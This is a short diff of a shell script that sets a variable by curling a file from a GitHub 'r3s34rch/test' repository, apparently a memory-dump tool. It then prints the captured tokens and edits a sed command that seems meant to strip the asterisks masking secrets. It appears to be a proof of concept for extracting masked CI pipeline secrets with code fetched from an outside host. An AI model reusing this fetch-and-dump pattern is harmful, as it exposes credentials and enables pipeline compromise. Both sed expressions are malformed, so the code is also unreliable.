@@ -8,7 +8,7 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "${TOKEN_VAL}"
 echo "---------------------------2--------------------------------------"
-echo "${TOKEN_VAL}" | sed 's/[*]/g'
+echo "${TOKEN_VAL}" | sed 's/\*\{1,\}/g'
 echo "---------------------------3--------------------------------------"
 
 
